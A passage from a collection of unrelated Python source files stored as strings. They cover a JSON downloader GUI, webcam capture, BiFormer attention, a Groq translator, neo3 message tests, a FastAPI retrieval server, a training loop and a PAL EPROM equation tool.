pady=5, sticky=\"ew\")\r\n        self.main_folder_label.grid(row=1, column=0, sticky=\"w\")\r\n        self.main_folder_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.delay_label.grid(row=2, column=0, sticky=\"w\")\r\n        self.delay_entry.grid(row=2, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.directory_size_label.grid(row=3, column=0, sticky=\"w\")\r\n        self.directory_size_entry.grid(row=3, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.keywords_label.grid(row=4, column=0, sticky=\"w\")\r\n        self.keywords_entry.grid(row=4, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.start_button.grid(row=5, column=0, columnspan=3, pady=10)\r\n        self.search_button.grid(row=6, column=0, columnspan=3, pady=10)\r\n        self.select_directory_button.grid(row=7, column=0, columnspan=3, pady=10)\r\n        self.console_label.grid(row=8, column=0, sticky=\"w\")\r\n        self.console_text.grid(row=9, column=0, columnspan=3, padx=10, pady=5, sticky=\"ew\")\r\n\r\n    def step1_download(self):\r\n        self.base_url = self.base_url_entry.get()\r\n        self.main_folder = self.main_folder_entry.get()\r\n        self.delay = float(self.delay_entry.get())\r\n        self.directory_size = int(self.directory_size_entry.get())\r\n\r\n        directories = {'': self.directory_size}  # Specified directory size\r\n\r\n        for directory, count in directories.items():\r\n            folder = os.path.join(self.main_folder, directory)\r\n            if not os.path.exists(folder):\r\n                os.makedirs(folder)\r\n\r\n            for i in range(0, count + 1):\r\n                url = f'{self.base_url}{directory}/{i}.json'\r\n                self.download_json(url)\r\n\r\n                time.sleep(self.delay)\r\n\r\n        messagebox.showinfo(\"Information\", \"Directory download process completed.\")\r\n        self.search_button.config(state=tk.NORMAL)\r\n\r\n    def download_json(self, url):\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                file_path = os.path.join(self.main_folder, f\"{url.split('/')[-1]}\")\r\n                with open(file_path, 'wb') as file:\r\n                    file.write(response.content)\r\n            else:\r\n                self.log(f\"Failed to download JSON from {url}. Status code: {response.status_code}\")\r\n        except Exception as e:\r\n            self.log(f\"Error downloading JSON from {url}: {e}\")\r\n\r\n    def step2_search(self):\r\n        keywords = [keyword.strip().lower() for keyword in self.keywords_entry.get().split(',')]\r\n        results = []\r\n\r\n        directory = self.main_folder_entry.get()\r\n        if directory and os.path.exists(directory):\r\n            self.log(f\"Searching directory: {directory}\")\r\n            for root, dirs, files in os.walk(directory):\r\n                for file in files:\r\n                    if file.endswith(\".json\"):\r\n                        file_path = os.path.join(root, file)\r\n                        self.log(f\"Searching file: {file_path",
    "import cv2\nimport os\nimport time\n\n\nmyPath = 'data/delta/Negative'\ncameraNo = 0\ncameraBrightness = 180\nmoduleVal = 10  \nminBlur = 500 \ngrayImage = False \nsaveData = True   \nshowImage = True \nimgWidth = 180\nimgHeight = 120\n\nglobal countFolder\ncap = cv2.VideoCapture(cameraNo)\ncap.set(3, 640)\ncap.set(4, 480)\ncap.set(10,cameraBrightness)\n\n\ncount = 0\ncountSave =0\n\ndef saveDataFunc():\n    global countFolder\n    countFolder = 0\n    while os.path.exists( myPath+ str(countFolder)):\n        countFolder += 1\n    os.makedirs(myPath + str(countFolder))\n\nif saveData:saveDataFunc()\n\n\nwhile True:\n\n    success, img = cap.read()\n    img = cv2.resize(img,(imgWidth,imgHeight))\n    if grayImage:img = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)\n    if saveData:\n        blur = cv2.Laplacian(img, cv2.CV_64F).var()\n        if count % moduleVal ==0 and blur > minBlur:\n            nowTime = time.time()\n            cv2.imwrite(myPath + str(countFolder) +\n                    '/' + str(countSave)+\"_\"+ str(int(blur))+\"_\"+str(nowTime)+\".png\", img)\n            countSave+=1\n        count += 1\n\n    if showImage:\n        cv2.imshow(\"Image\", img)\n\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\ncap.release()\ncv2.destroyAllWindows()",
    "\"\"\"\r\nCore of BiFormer, Bi-Level Routing Attention.\r\n\r\nTo be refactored.\r\n\r\nauthor: ZHU Lei\r\ngithub: https://github.com/rayleizhu\r\nemail: ray.leizhu@outlook.com\r\n\r\nThis source code is licensed under the license found in the\r\nLICENSE file in the root directory of this source tree.\r\n\"\"\"\r\nfrom typing import Tuple, Optional\r\n\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nfrom einops import rearrange\r\nfrom torch import Tensor, LongTensor\r\n\r\n\r\nclass TopkRouting(nn.Module):\r\n    \"\"\"\r\n    differentiable topk routing with scaling\r\n    Args:\r\n        qk_dim: int, feature dimension of query and key\r\n        topk: int, the 'topk'\r\n        qk_scale: int or None, temperature (multiply) of softmax activation\r\n        with_param: bool, wether inorporate learnable params in routing unit\r\n        diff_routing: bool, wether make routing differentiable\r\n        soft_routing: bool, wether make output value multiplied by routing weights\r\n    \"\"\"\r\n    def __init__(self, qk_dim, topk=4, qk_scale=None, param_routing=False, diff_routing=False):\r\n        super().__init__()\r\n        self.topk = topk\r\n        self.qk_dim = qk_dim\r\n        self.scale = qk_scale or qk_dim ** -0.5\r\n        self.diff_routing = diff_routing\r\n        # TODO: norm layer before/after linear?\r\n        self.emb = nn.Linear(qk_dim, qk_dim) if param_routing else nn.Identity()\r\n        # routing activation\r\n        self.routing_act = nn.Softmax(dim=-1)\r\n    \r\n    def forward(self, query:Tensor, key:Tensor)->Tuple[Tensor]:\r\n        \"\"\"\r\n        Args:\r\n            q, k: (n, p^2, c) tensor\r\n        Return:\r\n            r_weight, topk_index: (n, p^2, topk) tensor\r\n        \"\"\"\r\n        if not self.diff_routing:\r\n            query, key = query.detach(), key.detach()\r\n        query_hat, key_hat = self.emb(query), self.emb(key) # per-window pooling -> (n, p^2, c) \r\n        attn_logit = (query_hat*self.scale) @ key_hat.transpose(-2, -1) # (n, p^2, p^2)\r\n        topk_attn_logit, topk_index = torch.topk(attn_logit, k=self.topk, dim=-1) # (n, p^2, k), (n, p^2, k)\r\n        r_weight = self.routing_act(topk_attn_logit) # (n, p^2, k)\r\n        \r\n        return r_weight, topk_index\r\n        \r\n\r\nclass KVGather(nn.Module):\r\n    def __init__(self, mul_weight='none'):\r\n        super().__init__()\r\n        assert mul_weight in ['none', 'soft', 'hard']\r\n        self.mul_weight = mul_weight\r\n\r\n    def forward(self, r_idx:Tensor, r_weight:Tensor, kv:Tensor):\r\n        \"\"\"\r\n        r_idx: (n, p^2, topk) tensor\r\n        r_weight: (n, p^2, topk) tensor\r\n        kv: (n, p^2, w^2, c_kq+c_v)\r\n\r\n        Return:\r\n            (n, p^2, topk, w^2, c_kq+c_v) tensor\r\n        \"\"\"\r\n        # select kv according to routing index\r\n        n, p2, w2, c_kv = kv.size()\r\n        topk = r_idx.size(-1)\r\n        # print(r_idx.size(), r_weight.size())\r\n        # FIXME: gather consumes much memory (topk times redundancy), write cuda kernel? \r\n        topk_kv = torch.gather(kv.view(n, 1, p2, w2, c_kv).expand(-1, p2, -1, -1, -1), # (n, p^2, p^2, w^2, c_kv) without mem cpy\r\n                                dim=2,\r\n                                index=r_idx.view(n, p2, topk, 1, 1).expand(-1, -1, -1, w2, c_kv) # (n, p^2, k, w^2, c_kv)\r\n                               )\r\n\r\n        if self.mul_weight == 'soft':\r\n            topk_kv = r_weight.view(n, p2, topk, 1, 1) * topk_kv # (n, p^2, k, w^2, c_kv)\r\n        elif self.mul_weight == 'hard':\r\n            raise NotImplementedError('differentiable hard routing TBA')\r\n        # else: #'none'\r\n        #     topk_kv = topk_kv # do nothing\r\n\r\n        return topk_kv\r\n\r\nclass QKVLinear(nn.Module):\r\n    def __init__(self, dim, qk_dim, bias=True):\r\n        super().__init__()\r\n        self.dim = dim\r\n        self.qk_dim = qk_dim\r\n        self.qkv = nn.Linear(dim, qk_dim + qk_dim + dim, bias=bias)\r\n    \r\n    def forward(self, x):\r\n        q, kv = self.qkv(x).split([self.qk_dim, self.qk_dim+self.dim], dim=-1)\r\n        return q, kv\r\n        # q, k, v = self.qkv(x).split([self.qk_dim, self.qk_dim, self.dim], dim=-1)\r\n        # return q, k, v\r\n\r\nclass BiLevelRoutingAttention(nn.Module):\r\n    \"\"\"\r\n    n_win: number of windows in one side (so the actual number of windows is n_win*n_win)\r\n    kv_per_win: for kv_downsample_mode='ada_xxxpool' only, number of key/values per window. Similar to n_win, the actual number is kv_per_win*kv_per_win.\r\n    topk: topk for window filtering\r\n    param_attention: 'qkvo'-linear for q,k,v and o, 'none': param free attention\r\n    param_routing: extra linear for routing\r\n    diff_routing: wether to set routing differentiable\r\n    soft_routing: wether to multiply soft routing weights \r\n    \"\"\"\r\n    def __init__(self, dim, n_win=7, num_heads=8, qk_dim=None, qk_scale=None,\r\n                 kv_per_win=4, kv_downsample_ratio=4, kv_downsample_kernel=None, kv_downsample_mode='identity',\r\n                 topk=4, param_attention=\"qkvo\", param_routing=False, diff_routing=False, soft_routing=False, side_dwconv=3,\r\n                 auto_pad=True):\r\n  ",
    "# groq_translation.py\nimport json\nfrom typing import Optional\n\nfrom decouple import config\nfrom groq import Groq\nfrom pydantic import BaseModel\n\n# Set up the Groq client\nclient = Groq(api_key=config(\"GROQ_API_KEY\"))\n\n# Model for the translation\nclass Translation(BaseModel):\n    text: str\n    comments: Optional[str] = None\n\n\n# Translate text using the Groq API\ndef groq_translate(query, from_language, to_language):\n    # Create a chat completion\n    chat_completion = client.chat.completions.create(\n        messages=[\n            {\n                \"role\": \"system\",\n                \"content\": f\"You are a helpful assistant that translates text from {from_language} to {to_language}.\"\n                           f\"You will only reply with the translation text and nothing else in JSON.\"\n                           f\" The JSON object must use the schema: {json.dumps(Translation.model_json_schema(), indent=2)}\",\n            },\n            {\n                \"role\": \"user\",\n                \"content\": f\"Translate '{query}' from {from_language} to {to_language}.\"\n            }\n        ],\n        model=\"mixtral-8x7b-32768\",\n        temperature=0.2,\n        max_tokens=1024,\n        stream=False,\n        response_format={\"type\": \"json_object\"},\n    )\n    # Return the translated text\n    return Translation.model_validate_json(chat_completion.choices[0].message.content)\n",
    "import numpy as np\nimport matplotlib.pyplot as plt\nimport util\nimport marche_aleatoire\nimport time\n\n\ndef main() -> None:\n    nb_values = 70\n    N = np.linspace(20, 200, num=nb_values, dtype=int)\n    t = np.zeros(nb_values)\n    for i, n in np.ndenumerate(N):\n        coords = util.random_coords(n)\n        start_time = time.perf_counter()\n        marche_aleatoire.desirability_path_search(coords)\n        end_time = time.perf_counter()\n        t[i] = end_time - start_time\n        print(f'It\u00e9ration {i[0]} ; Taille {n} ; Temps {t[i]}', flush=True)\n\n    print('Temps total :', sum(t), flush=True)\n    fig, axes = plt.subplots(1, 2)\n    axes[0].plot(N, t)\n    axes[0].set_xlabel('Nombres de points')\n    axes[0].set_ylabel('Temps d\\'ex\u00e9cution (s)')\n    axes[1].plot(N, t/N)\n    axes[1].set_xlabel('Nombre de points n')\n    axes[1].set_ylabel(r\"Temps d'ex\u00e9cution divis\u00e9 par $n$\")\n    fig.suptitle('Complexit\u00e9 empirique de l\\'approche al\u00e9atoire')\n    plt.show()\n\n    return\n\n\nif __name__ == '__main__':\n    main()\n",
    "import unittest\nimport binascii\nimport lz4\nfrom unittest.mock import patch, call\nfrom neo3.network import message\nfrom neo3.network.payloads import (\n    inventory,\n    empty,\n    block,\n    transaction,\n    ping,\n    address,\n    version,\n)\nfrom neo3.core.types.uint import UInt256\nfrom neo3.core import serialization\n\n\nclass NetworkMessageTestCase(unittest.TestCase):\n    def test_create_no_payload(self):\n        m = message.Message(message.MessageType.PING, payload=None)\n        self.assertEqual(message.MessageType.PING, m.type)\n        self.assertEqual(message.MessageConfig.NONE, m.config)\n\n    def test_create_inv_message(self):\n        hashes = [UInt256.zero()]\n        inv_payload = inventory.InventoryPayload(inventory.InventoryType.BLOCK, hashes)\n        m = message.Message(message.MessageType.INV, inv_payload)\n        data = m.to_array()\n\n        self.assertEqual(message.MessageType.INV, m.type)\n        self.assertEqual(message.MessageConfig.NONE, m.config)\n        self.assertIsInstance(m.payload, inventory.InventoryPayload)\n\n        \"\"\"\n            Taken from constructing the same object in C#\n            \n            UInt256[] hashes = { UInt256.Zero };\n            var inv_payload = InvPayload.Create(InventoryType.Block, hashes);\n            ISerializable message = Message.Create(MessageCommand.Inv, inv_payload);\n\n            using (MemoryStream ms = new MemoryStream())\n            using (BinaryWriter writer = new BinaryWriter(ms))\n            {\n                message.Serialize(writer);\n                writer.Flush();\n                byte[] data = ms.ToArray();\n                Console.WriteLine($\"b\\'{BitConverter.ToString(data).Replace(\"-\",\"\")}\\'\");\n            }          \n\n        \"\"\"\n        expected_data = binascii.unhexlify(\n            b\"0027222C010000000000000000000000000000000000000000000000000000000000000000\"\n        )\n        self.assertEqual(expected_data, data)\n\n    def test_create_compressed_inv_message(self):\n        hashes = [UInt256.zero(), UInt256.zero(), UInt256.zero(), UInt256.zero()]\n        inv_payload = inventory.InventoryPayload(inventory.InventoryType.BLOCK, hashes)\n        m = message.Message(message.MessageType.INV, inv_payload)\n        data = m.to_array()  # triggers payload compression\n\n        self.assertEqual(message.MessageType.INV, m.type)\n        self.assertEqual(message.MessageConfig.COMPRESSED, m.config)\n        self.assertIsInstance(m.payload, inventory.InventoryPayload)\n\n        \"\"\"\n        Data created in the same fashion as how it's done in test_create_inv_message()\n        The deviation is `hashes` now contains 4 x UInt256.zero()\n        \"\"\"\n\n        expected_data = binascii.unhexlify(b\"012711820000003F2C0400010067500000000000\")\n        self.assertEqual(expected_data, data)\n\n    def test_inv_message_deserialization(self):\n        # see test_create_compressed_inv_message() how it was obtained\n        raw_data = binascii.unhexlify(b\"012711820000003F2C0400010067500000000000\")\n        m = message.Message.deserialize_from_bytes(raw_data)\n        self.assertIsInstance(m.payload, inventory.InventoryPayload)\n        self.assertEqual(132, len(m))\n\n    def test_deserialization_with_not_enough_data(self):\n        with self.assertRaises(ValueError) as context:\n            m = message.Message.deserialize_from_bytes(bytearray(2))\n        self.assertEqual(\n            str(context.exception), \"Could not read byte from empty stream\"\n        )\n\n    def test_deserialization_without_payload(self):\n        # some message types like PING/PONG have no payload\n        m = message.Message(message.MessageType.PING)\n        data = m.to_array()\n        m2 = message.Message.deserialize_from_bytes(data)\n        self.assertEqual(message.MessageType.PING, m2.type)\n        self.assertEqual(0, len(m2.payload))\n\n    def test_deserialization_from_stream(self):\n        # see test_create_compressed_inv_message() how it was obtained\n        raw_data = binascii.unhexlify(b\"012711820000003F2C0400010067500000000000\")\n        with serialization.BinaryReader(raw_data) as br:\n            m = message.Message(message.MessageType.DEFAULT)\n            m.deserialize(br)\n            self.assertEqual(m.type, message.MessageType.INV)\n            self.assertEqual(m.payload.type, inventory.InventoryType.BLOCK)\n\n    def test_deserialization_with_unsupported_payload_type(self):\n        hashes = [UInt256.zero()]\n        inv_payload = inventory.InventoryPayload(inventory.InventoryType.BLOCK, hashes)\n        m = message.Message(message.MessageType.ALERT, inv_payload)\n\n        m2 = message.Message.deserialize_from_bytes(m.to_array())\n        self.assertIsInstance(m2.payload, empty.EmptyPayload)\n\n    def test_deserialization_erroneous_compressed_data(self):\n        # see test_create_compressed_inv_message() how it was obtained\n        raw_data = binascii.unhexlify(b\"01270D3F020400010067500000000000\")\n\n        with patch(\"lz4.block.decompress\") as lz4_mock:\n            with self.assertRaises(ValueError) as context:\n        ",
    "from fastapi import FastAPI, UploadFile, File, HTTPException\nfrom langchain_community.document_loaders import PyPDFLoader, DirectoryLoader\nfrom langchain_community.embeddings import OllamaEmbeddings\nfrom langchain_community.vectorstores import Qdrant\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\nfrom pydantic import BaseModel\nimport uvicorn\nimport logging\nimport os\nfrom tqdm import tqdm\nimport time\nfrom qdrant_client import QdrantClient\nfrom qdrant_client.http import models\n\nclass Queryy(BaseModel):\n    query: str\n    top_k: int = 5\n\nlogging.basicConfig(level=logging.INFO)\nglobal_retriever = None\nABS_PATH: str = os.path.dirname(os.path.abspath(__file__))\nembeddings = OllamaEmbeddings(model=\"nomic-embed-text\")\n\napp = FastAPI()\n\n\ndef process_and_store_documents(documents, collection_name=\"my_documents\", batch_size=100):\n    global global_retriever\n\n    if documents:\n        start_time = time.time()\n        if global_retriever is None:\n            # Initialize the Qdrant vector store if it's not already initialized\n            qdrant = Qdrant.from_documents(\n                documents,\n                embeddings,\n                url=\"localhost:6333\",\n                collection_name=collection_name,\n                force_recreate=True,\n            )\n            global_retriever = qdrant.as_retriever()\n        else:\n            # Retrieve existing document IDs from the Qdrant vector store\n            existing_ids = set([doc.id for doc in global_retriever.vector_store.get_all_documents()])\n\n            # Process and store new documents in batches with progress tracking\n            total_added = 0\n            for i in tqdm(range(0, len(documents), batch_size), desc=\"Processing batches\"):\n                batch = documents[i:i + batch_size]\n                new_documents = [doc for doc in batch if doc.id not in existing_ids]\n                if new_documents:\n                    global_retriever.add_documents(new_documents)\n                    total_added += len(new_documents)\n                    logging.info(f\"Added {len(new_documents)} new documents to Qdrant collection: {collection_name}\")\n                    existing_ids.update([doc.id for doc in new_documents])\n\n            if total_added == 0:\n                logging.info(\"No new documents to add to Qdrant collection.\")\n\n        end_time = time.time()\n        logging.info(f\"Processing completed in {end_time - start_time:.2f} seconds.\")\n\n# Process the files from inside data/\npdf_loader = DirectoryLoader(\"db/\", glob=\"**/*.pdf\", loader_cls=PyPDFLoader)\nloaded_documents = pdf_loader.load()\n\n# Split loaded documents into chunks\ntext_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=40)\ndocs1 = text_splitter.split_documents(loaded_documents)\n\n# Store the document chunks from the db/ directory in the Qdrant vector store\nprocess_and_store_documents(docs1, collection_name=\"my_documents\")\n\n@app.post(\"/upload/\")\nasync def upload_file(file: UploadFile = File(...)):\n    file_location = f\"{ABS_PATH}/data/{file.filename}\"\n    try:\n        with open(file_location, \"wb+\") as file_object:\n            file_object.write(file.file.read())\n    except Exception as e:\n        raise HTTPException(status_code=500, detail=f\"Error saving file: {e}\")\n\n    # Process the uploaded file\n    docs = text_splitter.split_documents([file_location])\n\n    # Check if documents already exist in the collection\n    if global_retriever is not None:\n        existing_ids = [doc.id for doc in global_retriever.vector_store.get_all_documents()]\n        new_documents = [doc for doc in docs if doc.id not in existing_ids]\n\n        # Store only new document chunks in the Qdrant vector store\n        if new_documents:\n            process_and_store_documents(new_documents, collection_name=\"my_documents\")\n            return {\"status\": \"success\", \"message\": \"New file uploaded and processed successfully\"}\n        else:\n            return {\"status\": \"warning\", \"message\": \"No new documents found in the uploaded file\"}\n    else:\n        return {\"status\": \"error\", \"message\": \"Retriever not initialized. Please initialize Qdrant first.\"}\n\n@app.get(\"/retrieve/\")\ndef retrieve_top_contexts(query_data: Queryy):\n    query = query_data.query\n    top_k = query_data.top_k\n    if global_retriever is None:\n        return {\"status\": \"error\", \"message\": \"Retriever not initialized. Please upload documents first.\"}\n\n    top_contexts = global_retriever.get_relevant_documents(query, top_k=top_k)\n    return {\n        \"status\": \"success\",\n        \"query\": query,\n        \"top_contexts\": top_contexts\n    }\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"0.0.0.0\", port=8010)\n",
    "from typing import Optional\n\n# Definition for singly-linked list.\nclass ListNode:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\nclass Solution:\n    def middleNode(self, head: Optional[ListNode]) -> Optional[ListNode]:\n        fast, slow = head, head # Get's the second middle\n        # fast, slow = head, head.next # Get's the first middle\n\n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n        return slow\n\ndef create_linked_list(values):\n    if not values:\n        return None\n    head = ListNode(values[0])\n    current = head\n    for val in values[1:]:\n        current.next = ListNode(val)\n        current = current.next\n    return head\n\ndef linked_list_to_list(head):\n    values = []\n    current = head\n    while current:\n        values.append(current.val)\n        current = current.next\n    return values\n\ndef test_middleNode():\n    solution = Solution()\n    # Test with a linked list: 1 -> 2 -> 3 -> 4 -> 5\n    original_list = create_linked_list([1, 2, 3, 4, 5])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node.val == 3\n\n    # Test with a linked list: 1 -> 2 -> 3 -> 4 -> 5 -> 6\n    original_list = create_linked_list([1, 2, 3, 4, 5, 6])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node.val == 4\n\n    # Test with a linked list: 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7\n    original_list = create_linked_list([1, 2, 3, 4, 5, 6, 7])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node.val == 4\n\n    # Test with a linked list: 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7 -> 8\n    original_list = create_linked_list([1, 2, 3, 4, 5, 6, 7, 8])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node.val == 5\n\n    # Test with a linked list: 1 -> 2\n    original_list = create_linked_list([1, 2])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node.val == 2\n\n    # Test with an empty linked list\n    original_list = create_linked_list([])\n    middle_node = solution.middleNode(original_list)\n    assert middle_node == None\n\ntest_middleNode()\nprint(\"All Test Cases Passed!\")\n",
    "import torch\nfrom dataloader import ImageDataset\nfrom model import Model\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import DataLoader\nfrom tqdm import tqdm\nimport matplotlib.pyplot as plt\n\n\ndef calculate_metrics(model, dataloader, device, criterion):\n    model.eval()  # \u8bbe\u7f6e\u6a21\u578b\u4e3a\u8bc4\u4f30\u6a21\u5f0f\n    correct = 0\n    total = 0\n    total_loss = 0.0\n    with torch.no_grad():\n        for inputs, labels in dataloader:\n            inputs, labels = inputs.to(device), labels.to(device)\n            outputs = model(inputs)\n            loss = criterion(outputs, labels)  # \u8ba1\u7b97\u635f\u5931\n            total_loss += loss.item()  # \u7d2f\u52a0\u635f\u5931\n            _, predicted = torch.max(outputs.data, 1)\n            total += labels.size(0)\n            correct += (predicted == labels).sum().item()\n    avg_loss = total_loss / len(dataloader)\n    accuracy = 100 * correct / total\n    return avg_loss, accuracy\n\n\ndef plot_and_save_metrics(train_losses, val_losses, train_accuracies, val_accuracies, filename='training_metrics.png'):\n    plt.figure(figsize=(16, 6))\n\n    plt.subplot(1, 2, 1)\n    plt.plot(train_losses, label='Train Loss')\n    plt.plot(val_losses, label='Validation Loss')\n    plt.title('Training and Validation Loss')\n    plt.xlabel('Epoch')\n    plt.ylabel('Loss')\n    plt.legend()\n\n    plt.subplot(1, 2, 2)\n    plt.plot(train_accuracies, label='Train Accuracy')\n    plt.plot(val_accuracies, label='Validation Accuracy')\n    plt.title('Training and Validation Accuracy')\n    plt.xlabel('Epoch')\n    plt.ylabel('Accuracy')\n    plt.legend()\n\n    plt.tight_layout()\n    plt.savefig(filename)\n    plt.show()\n\n\n\nif __name__ == \"__main__\":\n    device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n\n    model = Model(58)\n    model.to(device)\n\n    criterion = nn.CrossEntropyLoss()\n    optimizer = optim.Adam(model.parameters(), lr=0.001)\n\n    train_data = ImageDataset(\n        annotations_file=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\train_data.csv',\n        img_dir=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\images'\n    )\n\n    val_data = ImageDataset(\n        annotations_file=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\val_data.csv',\n        img_dir=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\images'\n    )\n\n    train_dataloader = DataLoader(train_data, batch_size=160, shuffle=True)\n    val_dataloader = DataLoader(val_data, batch_size=160, shuffle=True)\n\n    num_epochs = 25\n    train_losses, val_losses, train_accuracies, val_accuracies = [], [], [], []\n    best_val_accuracy = 0\n\n    for epoch in range(num_epochs):\n        model.train()  # \u8bbe\u7f6e\u6a21\u578b\u4e3a\u8bad\u7ec3\u6a21\u5f0f\n        running_loss = 0.0\n        for imgs, labels in tqdm(train_dataloader, desc=f'Epoch {epoch + 1}/{num_epochs}'):\n            imgs, labels = imgs.to(device), labels.to(device)\n\n            optimizer.zero_grad()  # \u68af\u5ea6\u6e05\u96f6\n            outputs = model(imgs)  # \u524d\u5411\u4f20\u64ad\n            loss = criterion(outputs, labels)  # \u8ba1\u7b97\u635f\u5931\n            loss.backward()  # \u53cd\u5411\u4f20\u64ad\n            optimizer.step()  # \u66f4\u65b0\u6743\u91cd\n\n            running_loss += loss.item()\n\n        # \u8ba1\u7b97\u8bad\u7ec3\u96c6\u548c\u9a8c\u8bc1\u96c6\u7684\u51c6\u786e\u7387\n        train_loss, train_accuracy = calculate_metrics(model, train_dataloader, device, criterion)\n        train_losses.append(train_loss)\n        train_accuracies.append(train_accuracy)\n\n        val_loss, val_accuracy = calculate_metrics(model, val_dataloader, device, criterion)\n        val_losses.append(val_loss)\n        val_accuracies.append(val_accuracy)\n\n        if val_accuracy > best_val_accuracy:\n            best_val_accuracy = val_accuracy\n            # \u4fdd\u5b58\u6a21\u578b\n            torch.save(model.state_dict(), r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\save_model\\best_model.pt')\n            print(f\"New best model saved with val_accuracy: {best_val_accuracy}%\")\n\n        print(f\"Loss: {running_loss / len(train_dataloader)}, \"\n              f\"Train Accuracy: {train_accuracy}%, Val Accuracy: {val_accuracy}%\")\n\n    plot_and_save_metrics(train_losses, val_losses, train_accuracies, val_accuracies, 'metrics.png')\n    print('Finished Training')\n",
    "#\n# Copyright 2024 Johann Hanne\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy of\n# this software and associated documentation files (the \"Software\"), to deal in\n# the Software without restriction, including without limitation the rights to\n# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\n# of the Software, and to permit persons to whom the Software is furnished to do\n# so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n#\n\n# Version 1.0.0 (2024-05-12)\n\nimport argparse\nimport pathlib\nimport sympy\n\nparser = argparse.ArgumentParser(prog = 'pete',\n                    description = 'Transform PAL EPROM dump to equations',\n                    epilog = 'Needs sympy installed for simplified equations to be generated')\nparser.add_argument('-p', dest = 'pinnames', help = 'Comma separated pin names: pin1,pin2,pin3,...,pin9,pin11,pin12,pin13,...,pin19')\nparser.add_argument('-a', dest = 'andstr', default = '&' , help = 'string to use for logical and')\nparser.add_argument('-o', dest = 'orstr',  default = '#' , help = 'string to use for logical or')\nparser.add_argument('-n', dest = 'notstr', default = '!' , help = 'string to use for logical not')\nparser.add_argument('filename')\nargs = parser.parse_args()\n\nif args.pinnames is None:\n    pin_names = {k:f'pin{k}' for k in list(range(1,10)) + list(range(11,20))}\nelse:\n    userpinnames = args.pinnames.split(',')\n    if len(userpinnames) != 18:\n        raise RuntimeError('Wrong number of pin names (no names for GND and VCC!)')\n    pin_names = dict(zip(list(range(1,10)) + list(range(11,20)), userpinnames))\n\npin_name_maxlen = max((len(s) for s in pin_names.values()))\n\nfpath = pathlib.Path(args.filename)\n\nf = fpath.open(\"rb\")\ndumpdata = f.read()\nf.close()\n\nf_truthtable = (fpath.parent / (fpath.stem + '_pete_truthtable.txt')).open(\"wt\")\nf_equations = (fpath.parent / (fpath.stem + '_pete_equations.pld')).open(\"wt\")\n\nf_equations.write(f\"\"\"\\\nName {fpath.stem};\nDevice G16V8MA;\nPartno ;\nRevision ;\nDate ;\nDesigner ;\nCompany ;\nAssembly ;\nLocation ;\n\"\"\")\n\nfor number, name in pin_names.items():\n    f_equations.write(f'PIN {number}={name};\\n')\n\nandstr = args.andstr\norstr = args.orstr\nnotstr = args.notstr\n\nif len(dumpdata) != 262144:\n    raise RuntimeError(\"File with 262144 bytes expected\")\n\n# epromaddrbitpos is 0 for A0, 1 for A1, etc.\n# returned PAL pinnum is in range [1,19]\ndef epromaddrbitpos_to_palpinnum(epromaddrbitpos):\n    if epromaddrbitpos <= 8:\n        # A0 is connected to PAL pin 1\n        # A1 is connected to PAL pin 2\n        # ...\n        # A8 is connected to PAL pin 9\n        return epromaddrbitpos + 1\n    else:\n        # As PAL pin 10 is GND:\n        # A9 is connected to PAL pin 11\n        # A10 is connected to PAL pin 12\n        # ...\n        return epromaddrbitpos + 2\n\n# PAL pinnum is in range [1,19]\n# returned EPROM addrbitpos is in range [0,17]\ndef palpinnum_to_epromaddrbitpos(palpinnum):\n    if palpinnum <= 9:\n        # A0 is connected to PAL pin 1\n        # A1 is connected to PAL pin 2\n        # ...\n        # A8 is connected to PAL pin 9\n        return palpinnum - 1\n    else:\n        # As PAL pin 10 is GND:\n        # A9 is connected to PAL pin 11\n        # A10 is connected to PAL pin 12\n        # ...\n        return palpinnum - 2\n\n# PAL pinnum is in range [11,19]\n# returned EPROM databitpos is in range [0,7]\ndef palpinnum_to_epromdatabitpos(palpinnum):\n    # D0 is connected to PAL pin 12\n    # D1 is connected to PAL pin 13\n    # D2 is connected to PAL pin 14\n    # D3 is connected to PAL pin 15\n    # 